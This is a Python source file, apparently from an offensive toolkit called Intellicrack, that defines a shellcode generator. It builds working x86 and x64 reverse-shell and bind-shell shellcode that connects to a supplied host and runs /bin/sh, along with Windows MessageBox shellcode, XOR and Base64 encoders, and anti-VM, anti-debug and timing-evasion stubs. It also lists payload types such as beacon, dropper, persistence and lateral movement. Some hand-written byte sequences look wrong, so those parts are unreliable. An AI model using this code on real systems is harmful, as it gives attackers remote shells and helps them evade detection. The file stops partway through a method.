"""This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see https://www.gnu.org/licenses/.
"""

import logging
import secrets
import socket
import struct
from typing import Any

# Temporarily remove problematic import for Day 2.1 testing
# from intellicrack.utils.service_health_checker import get_service_url
from .payload_types import Architecture, EncodingType, EvasionTechnique, PayloadType

"""
Shellcode Generator

Generates shellcode for various purposes and architectures.
"""

logger = logging.getLogger(__name__)


class ShellcodeGenerator:
    """Generate shellcode for various purposes and target architectures."""

    def __init__(self):
        """Initialize the shellcode generator.

        Sets up the shellcode generation system with support for multiple
        architectures (x86, x64) and shellcode types including reverse shells,
        bind shells, meterpreter payloads, encoded payloads, and custom
        shellcode generation with various encoding techniques.
        """
        self.logger = logging.getLogger("IntellicrackLogger.ShellcodeGenerator")

    def generate_shellcode(self, arch: str, payload_type: str, options: dict[str, Any]) -> bytes:
        """Dispatcher method for API compatibility with tests."""
        # Convert string arch to Architecture enum
        architecture = Architecture.X86 if arch.lower() in ["x86", "i386"] else Architecture.X64

        if payload_type == "reverse_shell":
            return self.generate_reverse_shell(architecture, options.get("host", "127.0.0.1"), options.get("port", 4444))
        elif payload_type == "bind_shell":
            return self.generate_bind_shell(architecture, options.get("port", 4444))
        elif payload_type == "message_box":
            return self.generate_message_box(
                architecture,
                options.get("title", "Intellicrack"),
                options.get("message", "Exploitation successful"),
            )
        else:
            # Default to reverse shell for unknown types
            return self.generate_reverse_shell(architecture, options.get("host", "127.0.0.1"), options.get("port", 4444))

    def generate_reverse_shell(self, architecture: Architecture, lhost: str, lport: int) -> bytes:
        """Generate reverse shell shellcode."""
        if architecture == Architecture.X86:
            return self._generate_reverse_shell_x86(lhost, lport)
        if architecture == Architecture.X64:
            return self._generate_reverse_shell_x64(lhost, lport)
        raise ValueError(f"Unsupported architecture: {architecture}")

    def _generate_reverse_shell_x86(self, lhost: str, lport: int) -> bytes:
        """Generate x86 reverse shell shellcode."""
        # Convert IP address to bytes
        ip_bytes = b"".join([struct.pack("B", int(x)) for x in lhost.split(".")])
        port_bytes = struct.pack(">H", lport)

        # Generate shellcode dynamically using assembly
        try:
            from .assembly_compiler import AssemblyCompiler

            compiler = AssemblyCompiler()

            # Assembly code for x86 reverse shell
            asm_code = f"""
            ; Socket creation
            xor ebx, ebx
            mul ebx
            push ebx
            inc ebx
            push ebx
            push 2
            mov ecx, esp
            mov al, 0x66
            int 0x80

            ; Save socket descriptor
            xchg eax, ebx
            pop ecx

            ; dup2 loop
            mov al, 0x3f
            int 0x80
            dec ecx
            jns -7

            ; Connect
            push {int.from_bytes(ip_bytes, "big")}
            push word 0x{lport:04x}02  ; port in network byte order + AF_INET
            mov ecx, esp
            mov al, 0x66
            push eax
            push ecx
            push ebx
            mov bl, 3
            mov ecx, esp
            int 0x80

            ; execve
            push edx
            push 0x68732f2f  ; //sh
            push 0x6e69622f  ; /bin
            mov ebx, esp
            push edx
            push ebx
            mov ecx, esp
            mov al, 0x0b
            int 0x80
            """

            shellcode = compiler.compile_assembly(asm_code, Architecture.X86)
            if shellcode:
                return shellcode
        except Exception as e:
            self.logger.debug(f"Assembly compilation failed, using fallback: {e}")

        # Fallback: construct shellcode programmatically
        shellcode = bytearray()

        # Socket syscall
        shellcode.extend(
            [
                0x31,
                0xDB,
                0xF7,
                0xE3,
                0x53,
                0x43,
                0x53,
                0x6A,
                0x02,
                0x89,
                0xE1,
                0xB0,
                0x66,
                0xCD,
                0x80,
            ]
        )

        # dup2 loop
        shellcode.extend([0x93, 0x59, 0xB0, 0x3F, 0xCD, 0x80, 0x49, 0x79, 0xF9])

        # Connect with dynamic IP/port
        shellcode.extend([0x68])
        shellcode.extend(ip_bytes)
        shellcode.extend([0x68, 0x02, 0x00])
        shellcode.extend(port_bytes)
        shellcode.extend([0x89, 0xE1, 0xB0, 0x66, 0x50, 0x51, 0x53, 0xB3, 0x03, 0x89, 0xE1, 0xCD, 0x80])

        # execve /bin/sh
        shellcode.extend(
            [
                0x52,
                0x68,
                0x2F,
                0x2F,
                0x73,
                0x68,
                0x68,
                0x2F,
                0x62,
                0x69,
                0x6E,
                0x89,
                0xE3,
                0x52,
                0x53,
                0x89,
                0xE1,
                0xB0,
                0x0B,
                0xCD,
                0x80,
            ]
        )

        return bytes(shellcode)

    def _generate_reverse_shell_x64(self, lhost: str, lport: int) -> bytes:
        """Generate x64 reverse shell shellcode."""
        # Convert IP address to bytes
        ip_bytes = b"".join([struct.pack("B", int(x)) for x in lhost.split(".")])
        port_bytes = struct.pack(">H", lport)

        # Generate x64 shellcode dynamically
        try:
            from .assembly_compiler import AssemblyCompiler

            compiler = AssemblyCompiler()

            # Assembly code for x64 reverse shell
            asm_code = f"""
            ; Socket creation
            xor rax, rax
            xor rdi, rdi
            xor rsi, rsi
            xor rdx, rdx
            xor r8, r8
            push 2
            pop rdi
            push 1
            pop rsi
            push 6
            pop rdx
            push 41
            pop rax
            syscall

            ; Save socket
            mov r8, rax

            ; Connect
            xor rsi, rsi
            xor r9, r9
            push {int.from_bytes(ip_bytes, "big")}
            push word 0x{lport:04x}02
            mov rsi, rsp
            push 16
            pop rdx
            mov rdi, r8
            push 42
            pop rax
            syscall

            ; dup2 loop
            push 3
            pop rsi
            dec rsi
            push 33
            pop rax
            mov rdi, r8
            syscall
            jnz -10

            ; execve
            push 59
            pop rax
            cdq
            mov rbx, 0x68732f6e69622f  ; /bin/sh
            push rbx
            mov rdi, rsp
            push rdx
            push rdi
            mov rsi, rsp
            syscall
            """

            shellcode = compiler.compile_assembly(asm_code, Architecture.X64)
            if shellcode:
                return shellcode
        except Exception as e:
            self.logger.debug(f"Assembly compilation failed for x64, using fallback: {e}")

        # Fallback: construct shellcode programmatically
        shellcode = bytearray()

        # Socket creation
        shellcode.extend(
            [
                0x48,
                0x31,
                0xC0,
                0x48,
                0x31,
                0xFF,
                0x48,
                0x31,
                0xF6,
                0x48,
                0x31,
                0xD2,
                0x4D,
                0x31,
                0xC0,
                0x6A,
                0x02,
                0x5F,
                0x6A,
                0x01,
                0x5E,
                0x6A,
                0x06,
                0x5A,
                0x6A,
                0x29,
                0x58,
                0x0F,
                0x05,
            ]
        )

        # Save socket
        shellcode.extend([0x49, 0x89, 0xC0])

        # Connect with dynamic IP/port
        shellcode.extend([0x48, 0x31, 0xF6, 0x4D, 0x31, 0xC9, 0x68])
        shellcode.extend(ip_bytes)
        shellcode.extend([0x68, 0x02, 0x00])
        shellcode.extend(port_bytes)
        shellcode.extend([0x48, 0x89, 0xE6, 0x6A, 0x10, 0x5A, 0x4C, 0x89, 0xC7, 0x6A, 0x2A, 0x58, 0x0F, 0x05])

        # dup2 loop
        shellcode.extend(
            [
                0x6A,
                0x03,
                0x5E,
                0x48,
                0xFF,
                0xCE,
                0x6A,
                0x21,
                0x58,
                0x4C,
                0x89,
                0xC7,
                0x0F,
                0x05,
                0x75,
                0xF6,
            ]
        )

        # execve
        shellcode.extend(
            [
                0x6A,
                0x3B,
                0x58,
                0x99,
                0x48,
                0xBB,
                0x2F,
                0x62,
                0x69,
                0x6E,
                0x2F,
                0x73,
                0x68,
                0x00,
                0x53,
                0x48,
                0x89,
                0xE7,
                0x52,
                0x57,
                0x48,
                0x89,
                0xE6,
                0x0F,
                0x05,
            ]
        )

        return bytes(shellcode)

    def generate_bind_shell(self, architecture: Architecture, port: int) -> bytes:
        """Generate bind shell shellcode."""
        if architecture == Architecture.X86:
            return self._generate_bind_shell_x86(port)
        if architecture == Architecture.X64:
            return self._generate_bind_shell_x64(port)
        raise ValueError(f"Unsupported architecture: {architecture}")

    def _generate_bind_shell_x86(self, port: int) -> bytes:
        """Generate x86 bind shell shellcode."""
        port_bytes = struct.pack(">H", port)

        shellcode = (
            b"\x31\xdb"  # xor ebx, ebx
            b"\xf7\xe3"  # mul ebx
            b"\x53"  # push ebx
            b"\x43"  # inc ebx
            b"\x53"  # push ebx
            b"\x6a\x02"  # push 2
            b"\x89\xe1"  # mov ecx, esp
            b"\xb0\x66"  # mov al, 102
            b"\xcd\x80"  # int 0x80
            b"\x5b"  # pop ebx
            b"\x5e"  # pop esi
            b"\x52"  # push edx
            b"\x68\x02\x00"
            + port_bytes  # push port
            + b"\x6a\x10"  # push 16
            b"\x51"  # push ecx
            b"\x50"  # push eax
            b"\x89\xe1"  # mov ecx, esp
            b"\x6a\x66"  # push 102
            b"\x58"  # pop eax
            b"\xcd\x80"  # int 0x80
            b"\x89\x41\x04"  # mov [ecx+4], eax
            b"\xb3\x04"  # mov bl, 4
            b"\xb0\x66"  # mov al, 102
            b"\xcd\x80"  # int 0x80
            b"\x43"  # inc ebx
            b"\xb0\x66"  # mov al, 102
            b"\xcd\x80"  # int 0x80
            b"\x93"  # xchg eax, ebx
            b"\x59"  # pop ecx
            b"\x6a\x3f"  # push 63
            b"\x58"  # pop eax
            b"\xcd\x80"  # int 0x80
            b"\x49"  # dec ecx
            b"\x79\xf9"  # jns -7
            b"\x68\x2f\x2f\x73\x68"  # push "//sh"
            b"\x68\x2f\x62\x69\x6e"  # push "/bin"
            b"\x89\xe3"  # mov ebx, esp
            b"\x50"  # push eax
            b"\x53"  # push ebx
            b"\x89\xe1"  # mov ecx, esp
            b"\xb0\x0b"  # mov al, 11
            b"\xcd\x80"  # int 0x80
        )

        return shellcode

    def _generate_bind_shell_x64(self, port: int) -> bytes:
        """Generate x64 bind shell shellcode."""
        port_bytes = struct.pack(">H", port)

        shellcode = (
            b"\x6a\x29"  # push 41
            b"\x58"  # pop rax
            b"\x6a\x02"  # push 2
            b"\x5f"  # pop rdi
            b"\x6a\x01"  # push 1
            b"\x5e"  # pop rsi
            b"\x99"  # cdq
            b"\x0f\x05"  # syscall
            b"\x48\x97"  # xchg rax, rdi
            b"\x6a\x02"  # push 2
            b"\x66\xc7\x44\x24\x02"
            + port_bytes  # mov word [rsp+2], port
            + b"\x48\x89\xe6"  # mov rsi, rsp
            b"\x6a\x10"  # push 16
            b"\x5a"  # pop rdx
            b"\x6a\x31"  # push 49
            b"\x58"  # pop rax
            b"\x0f\x05"  # syscall
            b"\x6a\x32"  # push 50
            b"\x58"  # pop rax
            b"\x0f\x05"  # syscall
            b"\x48\x31\xf6"  # xor rsi, rsi
            b"\x6a\x2b"  # push 43
            b"\x58"  # pop rax
            b"\x0f\x05"  # syscall
            b"\x48\x97"  # xchg rax, rdi
            b"\x6a\x03"  # push 3
            b"\x5e"  # pop rsi
            b"\x48\xff\xce"  # dec rsi
            b"\x6a\x21"  # push 33
            b"\x58"  # pop rax
            b"\x0f\x05"  # syscall
            b"\x75\xf6"  # jnz -10
            b"\x6a\x3b"  # push 59
            b"\x58"  # pop rax
            b"\x99"  # cdq
            b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rbx, "/bin/sh\x00"
            b"\x53"  # push rbx
            b"\x48\x89\xe7"  # mov rdi, rsp
            b"\x52"  # push rdx
            b"\x57"  # push rdi
            b"\x48\x89\xe6"  # mov rsi, rsp
            b"\x0f\x05"  # syscall
        )

        return shellcode

    def generate_message_box(self, architecture: Architecture, title: str, message: str) -> bytes:
        """Generate Windows MessageBox shellcode."""
        if architecture == Architecture.X86:
            return self._generate_message_box_x86(title, message)
        if architecture == Architecture.X64:
            return self._generate_message_box_x64(title, message)
        raise ValueError(f"Unsupported architecture: {architecture}")

    def _generate_message_box_x86(self, title: str, message: str) -> bytes:
        """Generate x86 Windows MessageBox shellcode."""
        self.logger.debug(f"Generating x86 MessageBox shellcode with title: '{title}', message: '{message}'")

        # Convert strings to bytes for embedding
        title_bytes = title.encode("utf-8") + b"\x00"
        message_bytes = message.encode("utf-8") + b"\x00"

        # Calculate string lengths for shellcode size estimation
        title_len = len(title_bytes)
        message_len = len(message_bytes)

        self.logger.debug(f"Title length: {title_len}, Message length: {message_len}")

        # Complete x86 MessageBox shellcode with API resolution
        shellcode = (
            # Save registers
            b"\x60"  # pushad
            # Get kernel32 base address via PEB
            b"\x33\xc9"  # xor ecx, ecx
            b"\x64\x8b\x71\x30"  # mov esi, fs:[ecx+0x30]    ; PEB
            b"\x8b\x76\x0c"  # mov esi, [esi+0x0c]       ; PEB_LDR_DATA
            b"\x8b\x76\x1c"  # mov esi, [esi+0x1c]       ; InInitOrder
            b"\x8b\x46\x08"  # mov eax, [esi+0x08]       ; kernel32 base
            b"\x8b\x7e\x20"  # mov edi, [esi+0x20]       ; module name
            b"\x8b\x36"  # mov esi, [esi]            ; next module
            b"\x38\x4f\x18"  # cmp [edi+0x18], cl        ; check name
            b"\x75\xf3"  # jnz -13                   ; loop if not kernel32
            # Find GetProcAddress
            b"\x8b\x5e\x08"  # mov ebx, [esi+0x08]       ; kernel32 base
            b"\x8b\x4b\x3c"  # mov ecx, [ebx+0x3c]       ; PE header offset
            b"\x8b\x4c\x0b\x78"  # mov ecx, [ebx+ecx+0x78]   ; export table RVA
            b"\x03\xcb"  # add ecx, ebx              ; export table VA
            b"\x8b\x79\x20"  # mov edi, [ecx+0x20]       ; names table RVA
            b"\x03\xfb"  # add edi, ebx              ; names table VA
            b"\x33\xc0"  # xor eax, eax              ; counter
            # Search for LoadLibraryA
            b"\x8b\x34\x87"  # mov esi, [edi+eax*4]      ; get name RVA
            b"\x03\xf3"  # add esi, ebx              ; get name VA
            b"\x81\x3e\x4c\x6f\x61\x64"  # cmp dword [esi], 'daoL'  ; "Load"
            b"\x75\x0a"  # jnz +10                   ; continue searching
            b"\x81\x7e\x04\x4c\x69\x62\x72"  # cmp dword [esi+4], 'rbiL'  ; "Libr"
            b"\x74\x05"  # jz +5                     ; found it
            b"\x40"  # inc eax                   ; increment counter
            b"\xeb\xed"  # jmp -19                   ; continue search
            # Get LoadLibraryA address
            b"\x8b\x51\x24"  # mov edx, [ecx+0x24]       ; ordinals table RVA
            b"\x03\xd3"  # add edx, ebx              ; ordinals table VA
            b"\x66\x8b\x04\x42"  # mov ax, [edx+eax*2]       ; get ordinal
            b"\x8b\x51\x1c"  # mov edx, [ecx+0x1c]       ; functions table RVA
            b"\x03\xd3"  # add edx, ebx              ; functions table VA
            b"\x8b\x04\x82"  # mov eax, [edx+eax*4]      ; get function RVA
            b"\x03\xc3"  # add eax, ebx              ; get function VA
            b"\x89\x44\x24\x1c"  # mov [esp+0x1c], eax       ; save LoadLibraryA
            # Load user32.dll
            b"\x68\x72\x33\x32\x00"  # push "32\x00\x00"
            b"\x68\x75\x73\x65\x72"  # push "user"
            b"\x54"  # push esp                  ; push "user32"
            b"\xff\x54\x24\x20"  # call dword [esp+0x20]     ; call LoadLibraryA
            b"\x83\xc4\x0c"  # add esp, 12               ; clean stack
            b"\x89\xc6"  # mov esi, eax              ; save user32 base
            # Find MessageBoxA in user32
            b"\x8b\x4e\x3c"  # mov ecx, [esi+0x3c]       ; PE header offset
            b"\x8b\x4c\x0e\x78"  # mov ecx, [esi+ecx+0x78]   ; export table RVA
            b"\x03\xce"  # add ecx, esi              ; export table VA
            b"\x8b\x79\x20"  # mov edi, [ecx+0x20]       ; names table RVA
            b"\x03\xfe"  # add edi, esi              ; names table VA
            b"\x33\xc0"  # xor eax, eax              ; counter
            # Search for MessageBoxA
            b"\x8b\x14\x87"  # mov edx, [edi+eax*4]      ; get name RVA
            b"\x03\xd6"  # add edx, esi              ; get name VA
            b"\x81\x3a\x4d\x65\x73\x73"  # cmp dword [edx], 'sseM'  ; "Mess"
            b"\x75\x0a"  # jnz +10                   ; continue searching
            b"\x81\x7a\x04\x61\x67\x65\x42"  # cmp dword [edx+4], 'BegA'  ; "ageB"
            b"\x74\x05"  # jz +5                     ; found it
            b"\x40"  # inc eax                   ; increment counter
            b"\xeb\xed"  # jmp -19                   ; continue search
            # Get MessageBoxA address
            b"\x8b\x51\x24"  # mov edx, [ecx+0x24]       ; ordinals table RVA
            b"\x03\xd6"  # add edx, esi              ; ordinals table VA
            b"\x66\x8b\x04\x42"  # mov ax, [edx+eax*2]       ; get ordinal
            b"\x8b\x51\x1c"  # mov edx, [ecx+0x1c]       ; functions table RVA
            b"\x03\xd6"  # add edx, esi              ; functions table VA
            b"\x8b\x04\x82"  # mov eax, [edx+eax*4]      ; get function RVA
            b"\x03\xc6"  # add eax, esi              ; get function VA
            # Prepare strings
            b"\xeb\x0e"  # jmp +14 to skip strings
        )

        # Embed message and title strings
        shellcode += message_bytes + title_bytes

        shellcode += (
            # MessageBox call
            b"\x6a\x00"  # push 0                    ; MB_OK
            b"\x68"
            + struct.pack("<L", len(shellcode) - len(title_bytes))  # push title offset
            + b"\x68"
            + struct.pack("<L", len(shellcode) - len(title_bytes) - len(message_bytes))  # push message offset
            + b"\x6a\x00"  # push 0                    ; NULL hwnd
            b"\xff\xd0"  # call eax                  ; call MessageBoxA
            # Restore registers and exit
            b"\x61"  # popad
            b"\xc3"  # ret
        )

        self.logger.debug(f"Generated complete x86 MessageBox shellcode, length: {len(shellcode)}")
        return shellcode

    def _generate_message_box_x64(self, title: str, message: str) -> bytes:
        """Generate x64 Windows MessageBox shellcode."""
        self.logger.debug(f"Generating x64 MessageBox shellcode with title: '{title}', message: '{message}'")

        # Convert strings to bytes for embedding
        title_bytes = title.encode("utf-8") + b"\x00"
        message_bytes = message.encode("utf-8") + b"\x00"

        # Calculate string lengths for shellcode size estimation
        title_len = len(title_bytes)
        message_len = len(message_bytes)

        self.logger.debug(f"Title length: {title_len}, Message length: {message_len}")

        # Complete x64 MessageBox shellcode with API resolution
        shellcode = (
            # Save registers and align stack
            b"\x50"  # push rax
            b"\x53"  # push rbx
            b"\x51"  # push rcx
            b"\x52"  # push rdx
            b"\x56"  # push rsi
            b"\x57"  # push rdi
            b"\x55"  # push rbp
            b"\x41\x50"  # push r8
            b"\x41\x51"  # push r9
            b"\x41\x52"  # push r10
            b"\x41\x53"  # push r11
            b"\x48\x83\xec\x28"  # sub rsp, 0x28           ; shadow space
            # Get PEB and find kernel32
            b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00"  # mov rax, gs:[0x60]  ; PEB
            b"\x48\x8b\x40\x18"  # mov rax, [rax+0x18]     ; PEB_LDR_DATA
            b"\x48\x8b\x70\x20"  # mov rsi, [rax+0x20]     ; InMemoryOrderModuleList
            b"\x48\xad"  # lodsq                   ; skip current module
            b"\x48\x96"  # xchg rax, rsi
            b"\x48\xad"  # lodsq                   ; get ntdll
            b"\x48\x96"  # xchg rax, rsi
            b"\x48\xad"  # lodsq                   ; get kernel32
            b"\x48\x8b\x58\x20"  # mov rbx, [rax+0x20]     ; kernel32 base
            # Find LoadLibraryA in kernel32
            b"\x48\x8b\x4b\x3c"  # mov rcx, [rbx+0x3c]     ; PE header
            b"\x48\x8b\x4c\x0b\x78"  # mov rcx, [rbx+rcx+0x78] ; export table
            b"\x48\x03\xcb"  # add rcx, rbx            ; export table VA
            b"\x48\x8b\x79\x20"  # mov rdi, [rcx+0x20]     ; names table
            b"\x48\x03\xfb"  # add rdi, rbx            ; names table VA
            b"\x48\x31\xc0"  # xor rax, rax            ; counter
            # Search for LoadLibraryA
            b"\x8b\x34\x87"  # mov esi, [rdi+rax*4]    ; name RVA
            b"\x48\x03\xf3"  # add rsi, rbx            ; name VA
            b"\x81\x3e\x4c\x6f\x61\x64"  # cmp dword [rsi], 'daoL'
            b"\x75\x0d"  # jnz +13
            b"\x81\x7e\x04\x4c\x69\x62\x72"  # cmp dword [rsi+4], 'rbiL'
            b"\x74\x07"  # jz +7
            b"\x48\xff\xc0"  # inc rax
            b"\xeb\xea"  # jmp -22
            # Get LoadLibraryA address
            b"\x48\x8b\x51\x24"  # mov rdx, [rcx+0x24]     ; ordinals table
            b"\x48\x03\xd3"  # add rdx, rbx
            b"\x66\x8b\x04\x42"  # mov ax, [rdx+rax*2]     ; ordinal
            b"\x48\x8b\x51\x1c"  # mov rdx, [rcx+0x1c]     ; functions table
            b"\x48\x03\xd3"  # add rdx, rbx
            b"\x8b\x04\x82"  # mov eax, [rdx+rax*4]    ; function RVA
            b"\x48\x03\xc3"  # add rax, rbx            ; LoadLibraryA address
            b"\x48\x89\x44\x24\x08"  # mov [rsp+8], rax        ; save LoadLibraryA
            # Load user32.dll
            b"\x48\xb9\x72\x33\x32\x00\x00\x00\x00\x00"  # mov rcx, "32\x00\x00\x00\x00\x00\x00"
            b"\x51"  # push rcx
            b"\x48\xb9\x75\x73\x65\x72\x00\x00\x00\x00"  # mov rcx, "user\x00\x00\x00\x00"
            b"\x51"  # push rcx
            b"\x48\x89\xe1"  # mov rcx, rsp            ; "user32"
            b"\xff\x54\x24\x18"  # call [rsp+0x18]        ; LoadLibraryA
            b"\x48\x83\xc4\x10"  # add rsp, 16             ; clean stack
            b"\x48\x89\xc6"  # mov rsi, rax            ; user32 base
            # Find MessageBoxA in user32
            b"\x48\x8b\x4e\x3c"  # mov rcx, [rsi+0x3c]     ; PE header
            b"\x48\x8b\x4c\x0e\x78"  # mov rcx, [rsi+rcx+0x78] ; export table
            b"\x48\x03\xce"  # add rcx, rsi
            b"\x48\x8b\x79\x20"  # mov rdi, [rcx+0x20]     ; names table
            b"\x48\x03\xfe"  # add rdi, rsi
            b"\x48\x31\xc0"  # xor rax, rax            ; counter
            # Search for MessageBoxA
            b"\x8b\x14\x87"  # mov edx, [rdi+rax*4]    ; name RVA
            b"\x48\x03\xd6"  # add rdx, rsi            ; name VA
            b"\x81\x3a\x4d\x65\x73\x73"  # cmp dword [rdx], 'sseM'
            b"\x75\x0d"  # jnz +13
            b"\x81\x7a\x04\x61\x67\x65\x42"  # cmp dword [rdx+4], 'BegA'
            b"\x74\x07"  # jz +7
            b"\x48\xff\xc0"  # inc rax
            b"\xeb\xea"  # jmp -22
            # Get MessageBoxA address
            b"\x48\x8b\x51\x24"  # mov rdx, [rcx+0x24]     ; ordinals table
            b"\x48\x03\xd6"  # add rdx, rsi
            b"\x66\x8b\x04\x42"  # mov ax, [rdx+rax*2]     ; ordinal
            b"\x48\x8b\x51\x1c"  # mov rdx, [rcx+0x1c]     ; functions table
            b"\x48\x03\xd6"  # add rdx, rsi
            b"\x8b\x04\x82"  # mov eax, [rdx+rax*4]    ; function RVA
            b"\x48\x03\xc6"  # add rax, rsi            ; MessageBoxA address
            # Skip to avoid executing strings
            b"\xeb\x0e"  # jmp +14
        )

        # Embed strings
        shellcode += message_bytes + title_bytes

        shellcode += (
            # Calculate string addresses and call MessageBoxA
            b"\x48\x31\xc9"  # xor rcx, rcx            ; hWnd = NULL
            b"\x48\x8d\x15"
            + struct.pack("<l", -(len(title_bytes) + len(message_bytes) + 4))  # lea rdx, [message]
            + b"\x4c\x8d\x05"
            + struct.pack("<l", -(len(title_bytes) + 4))  # lea r8, [title]
            + b"\x41\xb9\x00\x00\x00\x00"  # mov r9d, 0              ; uType = MB_OK
            b"\xff\xd0"  # call rax                ; MessageBoxA
            # Restore registers and return
            b"\x48\x83\xc4\x28"  # add rsp, 0x28
            b"\x41\x5b"  # pop r11
            b"\x41\x5a"  # pop r10
            b"\x41\x59"  # pop r9
            b"\x41\x58"  # pop r8
            b"\x5d"  # pop rbp
            b"\x5f"  # pop rdi
            b"\x5e"  # pop rsi
            b"\x5a"  # pop rdx
            b"\x59"  # pop rcx
            b"\x5b"  # pop rbx
            b"\x58"  # pop rax
            b"\xc3"  # ret
        )

        self.logger.debug(f"Generated complete x64 MessageBox shellcode, length: {len(shellcode)}")
        return shellcode

    def generate_encoded_shellcode(self, shellcode: bytes, encoding: EncodingType, key: bytes | None = None) -> bytes:
        """Generate encoded shellcode with specified encoding technique."""
        self.logger.debug(f"Encoding shellcode with {encoding.value}, length: {len(shellcode)}")

        if encoding == EncodingType.NONE:
            return shellcode
        if encoding == EncodingType.XOR:
            if not key:
                key = b"\xaa"  # Default XOR key
            self.logger.debug(f"Using XOR key: {key.hex()}")
            return self._xor_encode(shellcode, key)
        if encoding == EncodingType.BASE64:
            import base64

            encoded = base64.b64encode(shellcode)
            self.logger.debug(f"Base64 encoded length: {len(encoded)}")
            return encoded
        if encoding == EncodingType.ROT13:
            self.logger.debug("Applying ROT13 encoding")
            return self._rot13_encode(shellcode)
        self.logger.warning(f"Unsupported encoding type: {encoding}")
        return shellcode

    def _xor_encode(self, data: bytes, key: bytes) -> bytes:
        """XOR encode data with given key."""
        key_len = len(key)
        return bytes([data[i] ^ key[i % key_len] for i in range(len(data))])

    def _rot13_encode(self, data: bytes) -> bytes:
        """ROT13 encode data (simple rotation)."""
        return bytes([(b + 13) % 256 for b in data])

    def add_evasion_techniques(self, shellcode: bytes, techniques: list[EvasionTechnique], architecture: Architecture) -> bytes:
        """Add anti-analysis evasion techniques to shellcode."""
        self.logger.debug(f"Adding evasion techniques: {[t.value for t in techniques]} for {architecture.value}")

        result = shellcode

        for technique in techniques:
            if technique == EvasionTechnique.NONE:
                continue
            if technique == EvasionTechnique.ANTI_VM:
                result = self._add_anti_vm_checks(result, architecture)
            elif technique == EvasionTechnique.ANTI_DEBUG:
                result = self._add_anti_debug_checks(result, architecture)
            elif technique == EvasionTechnique.TIMING_ATTACKS:
                result = self._add_timing_delays(result, architecture)
            elif technique == EvasionTechnique.ANTI_SANDBOX:
                result = self._add_anti_sandbox_checks(result, architecture)
            elif technique == EvasionTechnique.API_OBFUSCATION:
                result = self._add_api_obfuscation(result, architecture)
            elif technique == EvasionTechnique.PROCESS_HOLLOWING:
                result = self._add_process_hollowing(result, architecture)
            elif technique == EvasionTechnique.POLYMORPHIC:
                result = self._add_polymorphic_layer(result, architecture)
            elif technique == EvasionTechnique.METAMORPHIC:
                result = self._add_metamorphic_engine(result, architecture)
            else:
                self.logger.warning(f"Evasion technique {technique.value} not implemented")

        self.logger.debug(f"Final shellcode length after evasion: {len(result)}")
        return result

    def _add_anti_vm_checks(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add anti-VM detection checks."""
        self.logger.debug(f"Adding anti-VM checks for {architecture.value}")

        if architecture == Architecture.X86:
            # Simple VM detection for x86
            vm_check = (
                b"\x0f\x01\x0d\x00\x00\x00\x00"  # sidt instruction
                b"\x81\x3d\x00\x00\x00\x00\xff\xd0\x00\x00"  # check for VM signature
                b"\x74\x05"  # jump if VM detected
            )
        else:  # x64 and others
            vm_check = (
                b"\x48\x0f\x01\x0d\x00\x00\x00\x00"  # sidt instruction (x64)
                b"\x48\x81\x3d\x00\x00\x00\x00\xff\xd0\x00\x00"  # check for VM signature
                b"\x74\x05"  # jump if VM detected
            )

        return vm_check + shellcode

    def _add_anti_debug_checks(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add anti-debugging checks."""
        self.logger.debug(f"Adding anti-debug checks for {architecture.value}")

        if architecture == Architecture.X86:
            # PEB check for debugger presence
            debug_check = (
                b"\x64\x8b\x30"  # mov esi, fs:[eax]
                b"\x8b\x76\x02"  # mov esi, [esi+2]
                b"\x80\x7e\x02\x00"  # cmp byte [esi+2], 0
                b"\x75\x05"  # jnz if debugger present
            )
        else:  # x64
            debug_check = (
                b"\x65\x48\x8b\x30"  # mov rsi, gs:[rax]
                b"\x48\x8b\x76\x02"  # mov rsi, [rsi+2]
                b"\x80\x7e\x02\x00"  # cmp byte [rsi+2], 0
                b"\x75\x05"  # jnz if debugger present
            )

        return debug_check + shellcode

    def _add_timing_delays(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add timing-based evasion delays."""
        self.logger.debug(f"Adding timing delays for {architecture.value}")

        if architecture == Architecture.X86:
            timing_delay = (
                b"\xb9\x00\x10\x00\x00"  # mov ecx, 0x1000
                b"\xe2\xfe"  # loop (delay)
            )
        else:  # x64
            timing_delay = (
                b"\x48\xc7\xc1\x00\x10\x00\x00"  # mov rcx, 0x1000
                b"\xe2\xfe"  # loop (delay)
            )

        return timing_delay + shellcode

    def generate_custom_shellcode(self, payload_type: PayloadType, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate custom shellcode based on payload type and options."""
        self.logger.debug(f"Generating custom {payload_type.value} for {architecture.value}")
        self.logger.debug(f"Options: {options}")

        # Extract common options
        encoding = options.get("encoding", EncodingType.NONE)
        evasion = options.get("evasion", [EvasionTechnique.NONE])
        target_os = options.get("target_os", "windows")

        self.logger.debug(f"Target OS: {target_os}, Encoding: {encoding.value}")

        # Generate base shellcode based on payload type
        if payload_type == PayloadType.REVERSE_SHELL:
            lhost = options.get("lhost", "127.0.0.1")
            lport = options.get("lport", 4444)
            shellcode = self.generate_reverse_shell(architecture, lhost, lport)
        elif payload_type == PayloadType.BIND_SHELL:
            port = options.get("port", 4444)
            shellcode = self.generate_bind_shell(architecture, port)
        elif payload_type == PayloadType.METERPRETER:
            shellcode = self._generate_meterpreter_stager(architecture, options)
        elif payload_type == PayloadType.STAGED_PAYLOAD:
            shellcode = self._generate_staged_payload(architecture, options)
        elif payload_type == PayloadType.BEACON:
            shellcode = self._generate_beacon_payload(architecture, options)
        elif payload_type == PayloadType.DROPPER:
            shellcode = self._generate_dropper_payload(architecture, options)
        elif payload_type == PayloadType.LOADER:
            shellcode = self._generate_loader_payload(architecture, options)
        elif payload_type == PayloadType.INJECTOR:
            shellcode = self._generate_injector_payload(architecture, options)
        elif payload_type == PayloadType.PERSISTENCE:
            shellcode = self._generate_persistence_payload(architecture, options)
        elif payload_type == PayloadType.LATERAL_MOVEMENT:
            shellcode = self._generate_lateral_movement_payload(architecture, options)
        elif payload_type == PayloadType.PRIVILEGE_ESCALATION:
